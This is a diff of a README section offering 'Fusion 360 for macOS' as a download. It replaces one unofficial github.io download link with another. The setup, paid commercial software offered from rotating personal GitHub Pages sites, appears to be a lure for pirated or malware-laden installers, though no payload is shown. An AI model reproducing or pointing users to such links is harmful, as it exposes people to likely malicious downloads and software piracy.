@@ -4,7 +4,7 @@
 
 ## 📥 Download Fusion 360 for macOS
 
-[![⬇️ Download Fusion 360 for Mac](https://img.shields.io/badge/Download-Fusion%20360%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Fusion)
+[![⬇️ Download Fusion 360 for Mac](https://img.shields.io/badge/Download-Fusion%20360%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Fusion)
 
 ---
 
